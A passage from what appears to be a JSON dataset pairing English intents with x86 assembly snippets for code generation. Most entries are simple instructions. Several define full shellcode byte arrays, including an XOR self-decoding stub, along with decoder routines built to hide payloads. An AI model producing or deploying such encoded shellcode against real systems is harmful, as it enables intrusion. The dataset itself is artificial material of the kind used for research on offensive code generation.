    "snippet": "shellcode: db 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4",
    "slot_map": {
      "0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4": "var0"
    },
    "intent_tokens": [
      "shellcode",
      "contains",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the array of bytes shellcode 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d",
    "rewritten_intent": "define the array of bytes shellcode 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d",
    "snippet": "shellcode: db 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d",
    "slot_map": {
      "0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01",
    "rewritten_intent": "define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01",
    "snippet": "shellcode: db 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01",
    "slot_map": {
      "0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01": "var0"
    },
    "intent_tokens": [
      "define",
      "shellcode",
      "array",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa",
    "rewritten_intent": "shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa",
    "snippet": "shellcode: db 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa",
    "slot_map": {
      "0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa": "var0"
    },
    "intent_tokens": [
      "shellcode",
      "array",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "shellcode is an array of bytes 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb",
    "rewritten_intent": "shellcode is an array of bytes 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb",
    "snippet": "shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb",
    "slot_map": {
      "0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb": "var0"
    },
    "intent_tokens": [
      "shellcode",
      "array",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the array of bytes shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a",
    "rewritten_intent": "define the array of bytes shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a",
    "snippet": "shellcode: db 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a",
    "slot_map": {
      "0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "shellcode",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define shellcode as array of the bytes 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d",
    "rewritten_intent": "define shellcode as array of the bytes 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d",
    "snippet": "shellcode: db 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d",
    "slot_map": {
      "0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d": "var0"
    },
    "intent_tokens": [
      "define",
      "shellcode",
      "array",
      "bytes",
      "var0"
    ],
    "snippet_tokens": [
      "shellcode",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define shift_decode routine",
    "rewritten_intent": "define shift_decode routine",
    "snippet": "shift_decode:",
    "slot_map": {
      "shift_decode": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "routine"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "shift left 28 bits of eax",
    "rewritten_intent": "shift left 28 bits of eax",
    "snippet": "shl eax, 28",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "shift",
      "left",
      "28",
      "bits",
      "var0"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "28"
    ]
  },
  {
    "intent": "shift left the eax register by 28 bits",
    "rewritten_intent": "shift left the eax register by 28 bits",
    "snippet": "shl eax, 28",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "shift",
      "left",
      "var0",
      "register",
      "28",
      "bits"
    ],
    "snippet_tokens": [
      "shl",
      "var0",
      ",",
      "28"
    ]
  },
  {
    "intent": "shift the ax register to right by one bit",
    "rewritten_intent": "shift the ax register to right by one bit",
    "snippet": "shr ax, 1",
    "slot_map": {},
    "intent_tokens": [
      "shift",
      "ax",
      "register",
      "right",
      "one",
      "bit"
    ],
    "snippet_tokens": [
      "shr",
      "ax",
      ",",
      "1"
    ]
  },
  {
    "intent": "shift right ax by the contents of cl and negate the word in ax",
    "rewritten_intent": "shift right ax by the contents of cl and negate the word in ax",
    "snippet": "shr ax, cl \\n not word ax",
    "slot_map": {},
    "intent_tokens": [
      "shift",
      "right",
      "ax",
      "contents",
      "cl",
      "and",
      "negate",
      "word",
      "ax"
    ],
    "snippet_tokens": [
      "shr",
      "ax",
      ",",
      "cl",
      "\\n",
      "not",
      "word",
      "ax"
    ]
  },
  {
    "intent": "right shift the contents of bl by 4",
    "rewritten_intent": "right shift the contents of bl by 4",
    "snippet": "shr bl, 4",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "right",
      "shift",
      "contents",
      "var0",
      "4"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "shift right dl by 1",
    "rewritten_intent": "shift right dl by 1",
    "snippet": "shr dl, 1",
    "slot_map": {},
    "intent_tokens": [
      "shift",
      "right",
      "dl",
      "1"
    ],
    "snippet_tokens": [
      "shr",
      "dl",
      ",",
      "1"
    ]
  },
  {
    "intent": "shift right the dl register by 4 bits",
    "rewritten_intent": "shift right the dl register by 4 bits",
    "snippet": "shr dl, 4",
    "slot_map": {},
    "intent_tokens": [
      "shift",
      "right",
      "dl",
      "register",
      "4",
      "bits"
    ],
    "snippet_tokens": [
      "shr",
      "dl",
      ",",
      "4"
    ]
  },
  {
    "intent": "shift right 24 of eax",
    "rewritten_intent": "shift right 24 of eax",
    "snippet": "shr eax, 24",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "shift",
      "right",
      "24",
      "var0"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "24"
    ]
  },
  {
    "intent": "shift right 28 of eax",
    "rewritten_intent": "shift right 28 of eax",
    "snippet": "shr eax, 28",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "shift",
      "right",
      "28",
      "var0"
    ],
    "snippet_tokens": [
      "shr",
      "var0",
      ",",
      "28"
    ]
  },
  {
    "intent": "define stage and call decoder function",
    "rewritten_intent": "define stage and call decoder function",
    "snippet": "stage: \\n call decoder",
    "slot_map": {
      "decoder": "var0"
    },
    "intent_tokens": [
      "define",
      "stage",
      "and",
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "stage",
      ":",
      "\\n",
      "call",
      "var0"
    ]
  },
  {
    "intent": "subtract 13 from the ax register",
    "rewritten_intent": "subtract 13 from the ax register",
    "snippet": "sub ax, 13",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "13",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "ax",
      ",",
      "13"
    ]
  },
  {
    "intent": "subtract the contents of al from the bl register",
    "rewritten_intent": "subtract the contents of al from the bl register",
    "snippet": "sub bl, al",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "al",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "al"
    ]
  },
  {
    "intent": "subtract the current byte of the shellcode from bl",
    "rewritten_intent": "subtract the current byte of the shellcode from bl",
    "snippet": "sub bl, byte [esi]",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "subtract",
      "current",
      "byte",
      "shellcode",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "subtract 8 from the byte in esi and then negate the result",
    "rewritten_intent": "subtract 8 from the byte in esi and then negate the result",
    "snippet": "sub byte [esi], 8 \\n not byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "8",
      "byte",
      "var0",
      "and",
      "then",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "8",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "subtract the contents of dl from the cl register",
    "rewritten_intent": "subtract the contents of dl from the cl register",
    "snippet": "sub cl, dl",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "contents",
      "dl",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "cl",
      ",",
      "dl"
    ]
  },
  {
    "intent": "subtract al from dl and jump to decode_pr if the sign flag is zero",
    "rewritten_intent": "subtract al from dl and jump to decode_pr if the sign flag is zero",
    "snippet": "sub dl, al \\n jns decode_pr",
    "slot_map": {
      "decode_pr": "var0"
    },
    "intent_tokens": [
      "subtract",
      "al",
      "dl",
      "and",
      "jump",
      "var0",
      "if",
      "sign",
      "flag",
      "zero"
    ],
    "snippet_tokens": [
      "sub",
      "dl",
      ",",
      "al",
      "\\n",
      "jns",
      "var0"
    ]
  },
  {
    "intent": "subtract bx from dx",
    "rewritten_intent": "subtract bx from dx",
    "snippet": "sub dx, bx",
    "slot_map": {
      "bx": "var0",
      "dx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x7f from the stack",
    "rewritten_intent": "subtract 0x7f from the stack",
    "snippet": "sub esp, 0x7f",
    "slot_map": {
      "0x7f": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x7f from esp",
    "rewritten_intent": "subtract 0x7f from esp",
    "snippet": "sub esp, 0x7f",
    "slot_map": {
      "0x7f": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "esp"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "define the switch function",
    "rewritten_intent": "define the switch function",
    "snippet": "switch:",
    "slot_map": {
      "switch": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "jump to even_number is the contents in esi is even",
    "rewritten_intent": "jump to even_number is the contents in esi is even",
    "snippet": "test esi, 01h \\n je even_number",
    "slot_map": {
      "even_number": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "contents",
      "var1",
      "even"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "01h",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "swap al value with next byte value (esi+1)",
    "rewritten_intent": "swap al value with next byte value (esi+1)",
    "snippet": "xchg byte [esi+1], al",
    "slot_map": {
      "esi+1": "var0"
    },
    "intent_tokens": [
      "swap",
      "al",
      "value",
      "next",
      "byte",
      "value",
      "(",
      "esi+1",
      ")"
    ],
    "snippet_tokens": [
      "xchg",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "al"
    ]
  },
  {
    "intent": "perform xor between al and bl and jump short to shellcode if the result is zero",
    "rewritten_intent": "perform xor between al and bl and jump short to shellcode if the result is zero",
    "snippet": "xor al, bl \\n jz short shellcode",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "al",
      "and",
      "var0",
      "and",
      "jump",
      "short",
      "shellcode",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "al",
      ",",
      "var0",
      "\\n",
      "jz",
      "short",
      "shellcode"
    ]
  },
  {
    "intent": "perform xor between ax and 0x539 and store the result in ax",
    "rewritten_intent": "perform xor between ax and 0x539 and store the result in ax",
    "snippet": "xor ax, 0x539",
    "slot_map": {
      "0x539": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "ax",
      "and",
      "var0",
      "and",
      "store",
      "result",
      "ax"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform xor between ax and bx",
    "rewritten_intent": "perform xor between ax and bx",
    "snippet": "xor ax, bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "ax",
      "and",
      "var0"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform xor between ax and bx and jump to call decoded if the result is zero",
    "rewritten_intent": "perform xor between ax and bx and jump to call decoded if the result is zero",
    "snippet": "xor ax, bx \\n jz call_decoded",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "ax",
      "and",
      "var0",
      "and",
      "jump",
      "call",
      "decoded",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "ax",
      ",",
      "var0",
      "\\n",
      "jz",
      "call_decoded"
    ]
  },
  {
    "intent": "perform the xor between bh and the byte in esi+edx",
    "rewritten_intent": "perform the xor between bh and the byte in esi+edx",
    "snippet": "xor bh, byte [esi + edx]",
    "slot_map": {
      "esi+edx": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "bh",
      "and",
      "byte",
      "esi+edx"
    ],
    "snippet_tokens": [
      "xor",
      "bh",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "]"
    ]
  },
  {
    "intent": "perform xor between bl and 0xaa and jump to encodedshellcode if the result is not zero",
    "rewritten_intent": "perform xor between bl and 0xaa and jump to encodedshellcode if the result is not zero",
    "snippet": "xor bl, 0xaa \\n jne encodedshellcode",
    "slot_map": {
      "0xaa": "var1",
      "bl": "var0",
      "encodedshellcode": "var2"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "var0",
      "and",
      "var1",
      "and",
      "jump",
      "var2",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var1",
      "\\n",
      "jne",
      "var2"
    ]
  },
  {
    "intent": "perform xor between bl and 0xbb and jump to encoded if the result is zero",
    "rewritten_intent": "perform xor between bl and 0xbb and jump to encoded if the result is zero",
    "snippet": "xor bl, 0xbb \\n jz encoded",
    "slot_map": {
      "0xbb": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "var0",
      "and",
      "var1",
      "and",
      "jump",
      "encoded",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var1",
      "\\n",
      "jz",
      "encoded"
    ]
  },
  {
    "intent": "perform the xor between bl and 0xbb and jump to formatting if it is zero else move the byte of the shellcode in cl",
    "rewritten_intent": "perform the xor between bl and 0xbb and jump to formatting if it is zero else move the byte of the shellcode in cl",
    "snippet": "xor bl, 0xbb \\n jz formatting \\n mov cl, byte [esi]",
    "slot_map": {
      "0xbb": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "var0",
      "and",
      "var1",
      "and",
      "jump",
      "formatting",
      "if",
      "it",
      "zero",
      "else",
      "move",
      "byte",
      "shellcode",
      "cl"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "var1",
      "\\n",
      "jz",
      "formatting",
      "\\n",
      "mov",
      "cl",
      ",",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "perform the xor between bl and the byte in esi+edx",
    "rewritten_intent": "perform the xor between bl and the byte in esi+edx",
    "snippet": "xor bl, byte [esi + edx]",
    "slot_map": {
      "esi+edx": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "var0",
      "and",
      "byte",
      "esi+edx"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "byte",
      "[",
      "esi",
      "+",
      "edx",
      "]"
    ]
  },
  {
    "intent": "perform xor between bl and dl and jump short to shellcode if the result is not zero",
    "rewritten_intent": "perform xor between bl and dl and jump short to shellcode if the result is not zero",
    "snippet": "xor bl, dl \\n jz short shellcode",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "var0",
      "and",
      "dl",
      "and",
      "jump",
      "short",
      "shellcode",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "xor",
      "var0",
      ",",
      "dl",
      "\\n",
      "jz",
      "short",
      "shellcode"
    ]
  },
  {
    "intent": "xor between the current byte in esi and 0x88",
    "rewritten_intent": "xor between the current byte in esi and 0x88",
    "snippet": "xor byte [esi], 0x88",
    "slot_map": {
      "0x88": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "xor",
      "current",
      "byte",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "xor between current byte in esi and 0x97",
    "rewritten_intent": "xor between current byte in esi and 0x97",
    "snippet": "xor byte [esi], 0x97",
    "slot_map": {
      "0x97": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "xor",
      "current",
      "byte",
      "var0",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "xor",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "perform the xor between the current byte of the shellcode and the dl register",
    "rewritten_intent": "perform the xor between the current byte of the shellcode and the dl register",
    "snippet": "xor byte [esi], dl",
    "slot_map": {},
    "intent_tokens": [
      "perform",
      "xor",
      "current",
      "byte",
      "shellcode",
      "and",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "xor",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "perform the xor between the byte in esi and dl",
    "rewritten_intent": "perform the xor between the byte in esi and dl",
    "snippet": "xor byte [esi], dl",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "byte",
      "var0",
      "and",
      "dl"
    ],
    "snippet_tokens": [
      "xor",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "dl"
    ]
  },
  {
    "intent": "perform the xor between the current byte in esi and dl",
    "rewritten_intent": "perform the xor between the current byte in esi and dl",
    "snippet": "xor byte [esi], dl",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "perform",
      "xor",
      "current",
      "byte",
      "var0",
      "and",
